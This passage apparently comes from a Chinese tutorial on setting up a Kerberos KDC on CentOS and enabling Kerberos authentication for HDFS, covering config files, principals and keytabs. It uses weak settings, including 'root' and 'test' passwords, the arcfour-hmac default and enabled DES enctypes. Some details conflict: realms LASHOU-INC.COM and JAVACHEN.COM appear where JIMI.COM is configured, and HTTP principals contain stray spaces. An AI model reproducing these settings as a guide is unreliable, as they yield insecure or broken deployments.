和<code>krb5-client</code>。</p><p><code>yum install krb5-server -y</code></p><p>在所有节点上安装<code>krb5-devel</code>、<code>krb5-workstation</code>：</p><p><code>yum install krb5-devel krb5-workstation -y</code></p><p>修改配置文件</p><p>Kerberos的配置文件需要修改三个</p><p><code>/etc/krb5.conf</code></p><p><code>/var/kerberos/krb5kdc/kdc.conf</code></p><p><code>/var/kerberos/krb5kdc/kadm5.acl</code></p><p>配置Kerberos的krb5.conf</p><p>官网样例：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">[libdefaults]</span><br><span class="line">    default_realm = ATHENA.MIT.EDU</span><br><span class="line">    dns_lookup_kdc = true</span><br><span class="line">    dns_lookup_realm = false</span><br><span class="line"></span><br><span class="line">[realms]</span><br><span class="line">    ATHENA.MIT.EDU = &#123;</span><br><span class="line">        kdc = kerberos.mit.edu</span><br><span class="line">        kdc = kerberos-1.mit.edu</span><br><span class="line">        kdc = kerberos-2.mit.edu</span><br><span class="line">        admin_server = kerberos.mit.edu</span><br><span class="line">        master_kdc = kerberos.mit.edu</span><br><span class="line">    &#125;</span><br><span class="line">    EXAMPLE.COM = &#123;</span><br><span class="line">        kdc = kerberos.example.com</span><br><span class="line">        kdc = kerberos-1.example.com</span><br><span class="line">        admin_server = kerberos.example.com</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">[domain_realm]</span><br><span class="line">    mit.edu = ATHENA.MIT.EDU</span><br><span class="line"></span><br><span class="line">[capaths]</span><br><span class="line">    ATHENA.MIT.EDU = &#123;</span><br><span class="line">           EXAMPLE.COM = .</span><br><span class="line">    &#125;</span><br><span class="line">    EXAMPLE.COM = &#123;</span><br><span class="line">           ATHENA.MIT.EDU = .</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>说明：样例来自MIT官网，部分配置选项含义如下：</p><p><code>[logging]</code>：表示 server 端的日志的打印位置</p><p><code>[libdefaults]</code>：每种连接的默认配置，需要注意以下几个关键的小配置</p><p><code>default_realm = EXAMPLE.COM</code>：设置 Kerberos 应用程序的默认领域。如果您有多个领域，只需向 [realms] 节添加其他的语句。</p><p><code>ticket_lifetime</code>： 表明凭证生效的时限，一般为24小时。</p><p><code>renew_lifetime</code>： 表明凭证最长可以被延期的时限，一般为一个礼拜。当凭证过期之后，对安全认证的服务的后续访问则会失败。</p><p><code>clockskew</code>：时钟偏差是不完全符合主机系统时钟的票据时戳的容差，超过此容差将不接受此票据。通常，将时钟扭斜设置为 300 秒（5 分钟）。这意味着从服务器的角度看，票证的时间戳与它的偏差可以是在前后 5 分钟内。</p><p><code>udp_preference_limit= 1</code>：禁止使用 udp 可以防止一个 Hadoop 中的错误</p><p><code>[realms]</code>：列举使用的 realm。</p><p><code>kdc</code>：代表要 kdc 的位置。格式是 机器:端口</p><p><code>admin_server</code>：代表 admin 的位置。格式是 机器:端口</p><p><code>default_domain</code>：代表默认的域名</p><p><code>[appdefaults]</code>：可以设定一些针对特定应用的配置，覆盖默认配置。</p><p>经过一段时间的对比实验，最终配置文件设置为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">[logging]</span><br><span class="line">     default = FILE:/var/log/krb5libs.log</span><br><span class="line">     kdc = FILE:/var/log/krb5kdc.log</span><br><span class="line">     admin_server = FILE:/var/log/kadmind.log</span><br><span class="line"></span><br><span class="line">[libdefaults]</span><br><span class="line">     dns_lookup_realm = false</span><br><span class="line">     dns_lookup_kdc = false</span><br><span class="line">     ticket_lifetime = 24h</span><br><span class="line">     renew_lifetime = 7d</span><br><span class="line">     forwardable = true</span><br><span class="line">     renewable = true</span><br><span class="line">     udp_preference_limit = 1</span><br><span class="line">     rdns = false</span><br><span class="line">     pkinit_anchors = /etc/pki/tls/certs/ca-bundle.crt</span><br><span class="line">     default_realm = JIMI.COM</span><br><span class="line">     default_tgs_enctypes = arcfour-hmac</span><br><span class="line">     default_tkt_enctypes = arcfour-hmac</span><br><span class="line"></span><br><span class="line">[realms]</span><br><span class="line">    JIMI.COM = &#123;</span><br><span class="line">      kdc = master126</span><br><span class="line">      admin_server = master126</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">[domain_realm]</span><br><span class="line">     .jimi.com = JIMI.COM</span><br><span class="line">    jimi.com = JIMI.COM</span><br></pre></td></tr></table></figure><p>接下来是第二个配置文件<code>/var/kerberos/krb5kdc/kdc.conf</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[kdcdefaults]</span><br><span class="line"> kdc_ports = 88</span><br><span class="line"> kdc_tcp_ports = 88</span><br><span class="line"></span><br><span class="line">[realms]</span><br><span class="line"> JIMI.COM = &#123;</span><br><span class="line">  #master_key_type = aes256-cts</span><br><span class="line">  max_renewable_life= 7d 0h 0m 0s</span><br><span class="line">  acl_file = /var/kerberos/krb5kdc/kadm5.acl</span><br><span class="line">  dict_file = /usr/share/dict/words</span><br><span class="line">  admin_keytab = /var/kerberos/krb5kdc/kadm5.keytab</span><br><span class="line">  supported_enctypes = aes256-cts:normal aes128-cts:normal des3-hmac-sha1:normal arcfour-hmac:normal camellia256-cts:normal camellia128-cts:normal des-hmac-sha1:normal des-cbc-md5:normal des-cbc-crc:normal</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>这边直接放上配置文件，官方的配置文件相当冗余，加上版本问题，我删除了很多选项，只留下了小部分，剩下的应该会以默认值运行。</p><p>贴上一点简单的选项说明：</p><p><code>EXAMPLE.COM</code>： 是设定的 <code>realms</code>。名字随意。<code>Kerberos</code> 可以支持多个 <code>realms</code>，会增加复杂度。大小写敏感，一般为了识别使用全部大写。这个 <code>realms</code> 跟机器的 <code>host</code> 没有大关系。</p><p><code>master_key_type</code>：和 <code>supported_enctypes</code> 默认使用 <code>aes256-cts</code>。JAVA 使用 <code>aes256-cts</code> 验证方式需要安装 JCE 包，见下面的说明。为了简便，你可以不使用 <code>aes256-cts</code> 算法，这样就不需要安装 <code>JCE</code> 。</p><p><code>acl_file</code>：标注了 admin 的用户权限，需要用户自己创建。文件格式是：<code>Kerberos_principal permissions</code> [target_principal] [restrictions]</p><p><code>supported_enctypes</code>：支持的校验方式。</p><p>admin_keytab：KDC 进行校验的 keytab。</p><p>这边要注意，如果系统是Centos5.6及以上系统，默认使用AES-256来加密，但是这个AES-256 JDK的安全包里默认不存在，所以要去<a href="https://www.oracle.com/technetwork/cn/java/javase/downloads/jce8-download-2133166-zhs.html" target="_blank" rel="noopener">Oracle</a>下载，但是这个密码增强包貌似对JDK过高的版本支持有BUG，但是暂时好像还没遇到，下载下来之后放到这个目录里：$JAVA_HOME/jre/lib/security</p><p>还有一个文件<code>/var/kerberos/krb5kdc/kadm5.acl</code>：</p><p>这个是权限控制文件，修改为</p><p><a href="mailto:`*/admin@JIMI.COM" target="_blank" rel="noopener">`*/admin@JIMI.COM</a>        *`</p><p>这三个配置文件中只有krb5.conf需要拷贝到集群中其他服务器</p><p>别的两个配置文件不需要分发到别的节点。</p><p><strong>创建数据库</strong>：</p><p>原理里面已经讲过了KDC里面有一个小型的数据库，下面是对这个数据库的操作。</p><p>在master上运行初始化数据库命令，其中 -r 指定对应的realm</p><p><code>kdb5_util create -r JIMI.COM -s</code></p><p>出现 <code>loading random data</code> 的时候另开个终端执行点消耗CPU的命令如<code>cat /dev/sda &gt; /dev/urandom</code> 可以加快随机数采集。该命令会在<code>/var/kerberos/krb5kdc/</code> 目录下创建 <code>principal</code> 数据库。</p><p>如果遇到数据库已经存在的提示，可以把 <code>/var/kerberos/krb5kdc/</code> 目录下的 principal 的相关文件都删除掉。默认的数据库名字都是 <code>principal</code>。可以使用 -d 指定数据库名字。</p><p>这个数据库相当重要，后面还会介绍。</p><p><strong>启动服务</strong>：</p><p>在master节点上运行：</p><p>centos 6：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">chkconfig krb5kdc on </span><br><span class="line">chkconfig kadmin on </span><br><span class="line">service krb5kdc start </span><br><span class="line">service kadmin start</span><br></pre></td></tr></table></figure><p>centos 7：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">systemctl start krb5kdc </span><br><span class="line">systemctl start kadmin </span><br><span class="line">systemctl status krb5kdc </span><br><span class="line">systemctl status kadmin</span><br></pre></td></tr></table></figure><hr><p><strong>创建Kerberos管理员</strong></p><p>Kerberos的管理，有两个方式，分别是kadmin.local 或 kadmin，至于使用哪个，取决于账户和权限访问。</p><ul><li><p>如果有访问 kdc 服务器的 root 权限，但是没有 kerberos admin 账户，使用 kadmin.local</p></li><li><p>如果没有访问 kdc 服务器的 root 权限，但是用 kerberos admin 账户，使用 kadmin</p></li></ul><p>在master上创建远程管理的程序员:</p><p>#手动输入两次密码，这里密码为 root</p><p><code>kadmin.local -q &quot;addprinc root/admin&quot;</code></p><p>#也可以不用手动输入密码</p><p><code>echo -e &quot;root\nroot&quot; | kadmin.local -q &quot;addprinc root/admin&quot;</code></p><p>#或者运行下面命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kadmin.local &lt;&lt;eoj</span><br><span class="line">addprinc -pw root root/admin</span><br><span class="line">eoj</span><br></pre></td></tr></table></figure><p>系统时提示输入密码，密码不能为空，而且需要妥善保管。</p><p>测试Kerberos：</p><p>查看当前认证用户</p><p>#查看 principals</p><p><code>kadmin: list_principals</code></p><p>#添加一个新的principal</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">kadmin:  addprinc user1</span><br><span class="line">WARNING: no policy specified for user1@JIMI.COM; defaulting to no policy</span><br><span class="line">Enter password for principle</span><br><span class="line">Re-enter password for principal &quot;user1@JIMI.COM&quot;:</span><br><span class="line">Principal &quot;user1@JIMI.COM&quot; created.</span><br></pre></td></tr></table></figure><p>#删除 principal</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">kadmin:  delprinc user1</span><br><span class="line">Are you sure you want to delete the principal &quot;user1@JIMI.COM&quot;? (yes/no): yes</span><br><span class="line">Principal &quot;user1@JIMI.COM&quot; deleted.</span><br><span class="line">Make sure that you have removed this principal from all ACLs before reusing.</span><br><span class="line">kadmin:exit</span><br></pre></td></tr></table></figure><p>也可以直接通过下面的命令来执行</p><p>#提示需要输入密码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kadmin -p root/admin -q &quot;list_principals&quot;</span><br><span class="line">kadmin -p root/admin -q &quot;list_principals&quot;</span><br><span class="line">kadmin -p root/admin -q &quot;addprinc user2&quot;</span><br></pre></td></tr></table></figure><p>#不用输入密码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kadmin.local -q &quot;list_principals&quot;</span><br><span class="line">kadmin.local -q &quot;addprinc user2&quot;</span><br><span class="line">kadmin.local -q &quot;delprinc user2&quot;</span><br></pre></td></tr></table></figure><p>#创建一个测试用户test，密码设置为test：</p><p><code>echo -e &quot;test\ntest&quot; | kadmin.local -q &quot;addprinc test&quot;</code></p><p>#获取test用户的ticket 通过用户名和密码登录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">kinit test</span><br><span class="line">Password for test@JIMI.COM</span><br><span class="line">klist -e </span><br><span class="line">Ticket cache: FILE:/tmp/krb5cc_0</span><br><span class="line">Default principal: test@JIMI.COM</span><br><span class="line">Valid starting     Expires            Service principal</span><br><span class="line">11/07/14 15:29:02  11/08/14 15:29:02  krbtgt/JIMI.COM@JIMI.COM</span><br><span class="line">  renew until 11/17/14 15:29:02, Etype (skey, tkt): aes256-cts-hmac-sha1-96, aes256-cts-hmac-sha1-96</span><br><span class="line">Kerberos 4 ticket cache: /tmp/tkt0</span><br><span class="line">klist: You have no tickets cached</span><br></pre></td></tr></table></figure><p>销毁test用户的ticket</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">kdestroy</span><br><span class="line">klist</span><br><span class="line">klist: No credentials cache found (ticket cache FILE:/tmp/krb5cc_0)</span><br><span class="line">Kerberos 4 ticket cache: /tmp/tkt0</span><br><span class="line">klist: You have no tickets cached</span><br></pre></td></tr></table></figure><p>更新ticket</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">kinit root/admin</span><br><span class="line">Password for root/admin@JIMI.COM</span><br><span class="line">klist</span><br><span class="line">Ticket cache: FILE:/tmp/krb5cc_0</span><br><span class="line">Default principal: root/admin@JIMI.COM</span><br><span class="line">Valid starting     Expires            Service principal</span><br><span class="line">11/07/14 15:33:57  11/08/14 15:33:57  krbtgt/JIMI.COM@JIMI.COM</span><br><span class="line">renew until 11/17/14 15:33:57</span><br><span class="line">Kerberos 4 ticket cache: /tmp/tkt0</span><br><span class="line">klist: You have no tickets cached</span><br><span class="line">kinit -R</span><br><span class="line">klist</span><br><span class="line">Ticket cache: FILE:/tmp/krb5cc_0</span><br><span class="line">Default principal: root/admin@JIMI.COM</span><br><span class="line">Valid starting     Expires            Service principal</span><br><span class="line">11/07/14 15:34:05  11/08/14 15:34:05  krbtgt/JIMI.COM@JIMI.COM</span><br><span class="line">renew until 11/17/14 15:33:57</span><br><span class="line">Kerberos 4 ticket cache: /tmp/tkt0</span><br><span class="line">klist: You have no tickets cached</span><br></pre></td></tr></table></figure><p>抽取密钥并将其储存在本地 keytab 文件 /etc/krb5.keytab 中。这个文件由超级用户拥有，所以您必须是 root 用户才能在 kadmin shell 中执行以下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">kadmin.local -q &quot;ktadd kadmin/admin&quot;</span><br><span class="line">klist -k /etc/krb5.keytab</span><br><span class="line">Keytab name: FILE:/etc/krb5.keytab</span><br><span class="line">KVNO Principal</span><br><span class="line">---------------------------------------------------------</span><br><span class="line">     3 kadmin/admin@LASHOU-INC.COM</span><br><span class="line">     3 kadmin/admin@LASHOU-INC.COM</span><br><span class="line">     3 kadmin/admin@LASHOU-INC.COM</span><br><span class="line">     3 kadmin/admin@LASHOU-INC.COM</span><br><span class="line">     3 kadmin/admin@LASHOU-INC.COM</span><br></pre></td></tr></table></figure><p>HDFS上配置kerberos</p><p>创建认证规则</p><p>在 <code>Kerberos</code> 安全机制里，一个 <code>principal</code> 就是 <code>realm</code> 里的一个对象，一个 <code>principal</code> 总是和一个密钥（<code>secret key</code>）成对出现的。</p><p>这个 <code>principal</code> 的对应物可以是 <code>service</code>，可以是 <code>host</code>，也可以是 <code>user</code>，对于 <code>Kerberos</code> 来说，都没有区别。</p><p><code>Kdc(Key distribute center)</code> 知道所有 <code>principal</code> 的 <code>secret key</code>，但每个 <code>principal</code> 对应的对象只知道自己的那个 <code>secret key</code> 。这也是“共享密钥“的由来。</p><p>对于 <code>hadoop</code>，<code>principals</code> 的格式为</p><p><a href="mailto:`username/fully.qualified.domain.name@YOUR-REALM.COM" target="_blank" rel="noopener">`username/fully.qualified.domain.name@YOUR-REALM.COM</a>`</p><p>通过 <code>yum</code> 源安装的 <code>cdh</code> 集群中，NameNode和 DataNode 是通过 hdfs 启动的，故为集群中每个服务器节点添加两个<code>principals：hdfs</code>、HTTP。</p><p>在 KCD server 上（这里是 cdh1）创建 hdfs principal：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kadmin.local -q "addprinc -randkey hdfs/datanode0@JIMI.COM"</span><br><span class="line">kadmin.local -q "addprinc -randkey hdfs/datanode1@JIMI.COM"</span><br><span class="line">kadmin.local -q "addprinc -randkey hdfs/master@JIMI.COM"</span><br></pre></td></tr></table></figure><p>-randkey<br>标志没有为新 <code>principal</code> 设置密码，而是指示 <code>kadmin</code> 生成一个随机密钥。之所以在这里使用这个标志，是因为此 <code>principal</code> 不需要用户交互。它是计算机的一个服务器账户。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kadmin.local -q "addprinc -randkey HTTP/ datanode0@JIMI.COM "</span><br><span class="line">kadmin.local -q "addprinc -randkey HTTP/ datanode1@JIMI.COM "</span><br><span class="line">kadmin.local -q "addprinc -randkey HTTP/ master@JIMI.COM "</span><br></pre></td></tr></table></figure><p>创建完成后，查看：</p><p><code>kadmin.local -q &quot;listprincs&quot;</code></p><p>手动创建keytab文件</p><p><code>keytab</code>是包含 <code>principals</code> 和加密 <code>principal key</code> 的文件。<code>keytab</code> 文件对于每个 <code>host</code>是唯一的，因为 <code>key</code> 中包含 <code>hostname</code>。<code>keytab</code>文件用于不需要人工交互和保存纯文本密码，实现到 <code>kerberos</code> 上验证一个主机上的 <code>principal</code>。因为服务器上可以访问 <code>keytab</code> 文件即可以以 <code>principal</code> 的身份通过 <code>kerberos</code> 的认证，所以，<code>keytab</code> 文件应该被妥善保存，应该只有少数的用户可以访问。</p><p>创建包含 hdfs principal 和 host principal 的 hdfs keytab：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xst -norandkey -k hdfs.keytab hdfs/fully.qualified.domain.name host/fully.qualified.domain.name</span><br></pre></td></tr></table></figure><p>创建包含 mapred principal 和 host principal 的 mapred keytab：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xst -norandkey -k mapred.keytab mapred/fully.qualified.domain.name host/fully.qualified.domain.name</span><br></pre></td></tr></table></figure><p>注意：上面的方法使用了xst的norandkey参数，有些kerberos不支持该参数。<br>当不支持该参数时有这样的提示：<code>Principal -norandkey does not exist</code>.，需要使用下面的方法来生成keytab文件:</p><p>在master节点，即KDC server节点上执行下面的命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">cd /var/kerberos/krb5kdc/</span><br><span class="line">kadmin.local -q "xst  -k hdfs-unmerged.keytab  hdfs/datanode0@JIMI.COM"</span><br><span class="line">kadmin.local -q "xst  -k hdfs-unmerged.keytab  hdfs/datanode1@JIMI.COM"</span><br><span class="line">kadmin.local -q "xst  -k hdfs-unmerged.keytab  hdfs/master@JIMI.COM"</span><br><span class="line">----------------------------------------------------------------------------------</span><br><span class="line">kadmin.local -q "xst  -k HTTP.keytab  HTTP/ datanode0@JIMI.COM "</span><br><span class="line">kadmin.local -q "xst  -k HTTP.keytab  HTTP/ datanode1@JIMI.COM "</span><br><span class="line">kadmin.local -q "xst  -k HTTP.keytab  HTTP/ master@JIMI.COM "</span><br></pre></td></tr></table></figure><p>这样，就会在 /var/kerberos/krb5kdc/ 目录下生成hdfs-unmerged.keytab 和 HTTP.keytab 两个文件，接下来使用 ktutil 合并者两个文件为 hdfs.keytab。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cd /var/kerberos/krb5kdc/</span><br><span class="line">ktutil</span><br><span class="line">ktutil: rkt hdfs-unmerged.keytab</span><br><span class="line">ktutil: rkt HTTP.keytab</span><br><span class="line">ktutil: wkt hdfs.keytab</span><br><span class="line">ktutil: exit</span><br></pre></td></tr></table></figure><p>使用 klist 即可查看 hdfs.keytab 文件列表：（省略）</p><p>验证是否正确合并了key，使用合并后的keytab，分别使用hdfs和host principals来获取证书。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kinit -k -t hdfs.keytab hdfs/master@JIMI.COM</span><br><span class="line">kinit -k -t hdfs.keytab HTTP/master@JIMI.COM</span><br></pre></td></tr></table></figure><p>如果出现错误：<code>kinit: Key table entry not found while getting initial credentials</code>，则上面的合并有问题，重新执行前面的操作。</p><p>部署kerberos keytab文件</p><p>拷贝 hdfs.keytab 文件到其他节点的 /etc/hadoop/conf 目录</p><p>并设置权限，分别在三个节点上运行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chown hdfs:hadoop /etc/hadoop/conf/hdfs.keytab</span><br><span class="line">chmod 400 /etc/hadoop/conf/hdfs.keytab</span><br></pre></td></tr></table></figure><p>原因：</p><p>由于 keytab 相当于有了永久凭证，不需要提供密码(如果修改<code>kdc</code>中的<code>principal</code>的密码，则该<code>keytab</code>就会失效)，所以其他用户如果对该文件有读权限，就可以冒充 <code>keytab</code> 中指定的用户身份访问 <code>hadoop</code>，所以 <code>keytab</code> 文件需要确保只对 <code>owner</code> 有读权限(0400)</p><p>修改hdfs配置文件，先停止集群</p><p>在集群总所有节点的<code>core-site.xml</code>文件中添加下面的配置：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;property&gt;</span><br><span class="line">  &lt;name&gt;hadoop.security.authentication&lt;/name&gt;</span><br><span class="line">  &lt;value&gt;kerberos&lt;/value&gt;</span><br><span class="line">&lt;/property&gt;</span><br><span class="line"></span><br><span class="line">&lt;property&gt;</span><br><span class="line">  &lt;name&gt;hadoop.security.authorization&lt;/name&gt;</span><br><span class="line">  &lt;value&gt;true&lt;/value&gt;</span><br><span class="line">&lt;/property&gt;</span><br></pre></td></tr></table></figure><p>在集群总所有节点的<code>hdfs-site.xml</code>文件中添加下面的配置：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">&lt;property&gt;</span><br><span class="line">  &lt;name&gt;dfs.block.access.token.enable&lt;/name&gt;</span><br><span class="line">  &lt;value&gt;true&lt;/value&gt;</span><br><span class="line">&lt;/property&gt;</span><br><span class="line">&lt;property&gt;  </span><br><span class="line">  &lt;name&gt;dfs.datanode.data.dir.perm&lt;/name&gt;  </span><br><span class="line">  &lt;value&gt;700&lt;/value&gt;  </span><br><span class="line">&lt;/property&gt;</span><br><span class="line">&lt;property&gt;</span><br><span class="line">  &lt;name&gt;dfs.namenode.keytab.file&lt;/name&gt;</span><br><span class="line">  &lt;value&gt;/etc/hadoop/conf/hdfs.keytab&lt;/value&gt;</span><br><span class="line">&lt;/property&gt;</span><br><span class="line">&lt;property&gt;</span><br><span class="line">  &lt;name&gt;dfs.namenode.kerberos.principal&lt;/name&gt;</span><br><span class="line">  &lt;value&gt;hdfs/_HOST@JAVACHEN.COM&lt;/value&gt;</span><br><span class="line">&lt;/property&gt;</span><br><span class="line">&lt;property&gt;</span><br><span class="line">  &lt;name&gt;dfs.namenode.kerberos.https.principal&lt;/name&gt;</span><br><span class="line">  &lt;value&gt;HTTP/_HOST@JAVACHEN.COM&lt;/value&gt;</span><br><span class="line">&lt;/property&gt;</span><br><span class="line">&lt;property&gt;</span><br><span class="line">  &lt;name&gt;dfs.datanode.address&lt;/name&gt;</span><br><span class="line">  &lt;value&gt;0.0.0.0:1004&lt;/value&gt;</span><br><span class="line">&lt;/property&gt;</span><br><span class="line">&lt;property&gt;</span><br><span class="line">  &lt;name&gt;dfs.datanode.http.address&lt;/name&gt;</span><br><span class="line">  &lt;value&gt;0.0.0.0:1006&lt;/value&gt;</span><br><span class="line">&lt;/property&gt;</span><br><span class="line">&lt;property&gt;</span><br><span class="line">  &lt;name&gt;dfs.datanode.keytab.file&lt;/name&gt;</span><br><span class="line">  &lt;value&gt;/etc/hadoop/conf/hdfs.keytab&lt;/value&gt;</span><br><span class="line">&lt;/property&gt;</span><br><span class="line">&lt;property&gt;</span><br><span class="line">  &lt;name&gt;dfs.datanode.kerberos.principal&lt;/name&gt;</span><br><span class="line">  &lt;value&gt;hdfs/_HOST@JAVACHEN.COM&lt;/value&gt;</span><br><span class="line">&lt;/property&gt;</span><br><span class="line">&lt;property&gt;</span><br><span class="line">  &lt;name&gt;dfs.datanode.kerberos.https.principal&lt;/name&gt;</span><br><span class="line">  &lt;value&gt;HTTP/_HOST@JAVACHEN.COM&lt;/value&gt;</span><br><span class="line">&lt;/property&gt;</span><br></pre></td></tr></table></figure><p>如果想开启 SSL，请添加（本文不对这部分做说明）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;property&gt;</span><br><span class="line">  &lt;name&gt;dfs.http.policy&lt;/name&gt;</span><br><span class="line">  &lt;value&gt;HTTPS_ONLY&lt;/value&gt;</span><br><span class="line">&lt;/property&gt;</span><br></pre></td></tr></table></figure><p>如果 HDFS 配置了 QJM HA，则需要添加（另外，你还要在 zookeeper 上配置 kerberos）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;property&gt;</span><br><span class="line">  &lt;name&gt;dfs.journalnode.keytab.file&lt;/name&gt;</span><br><span class="line">  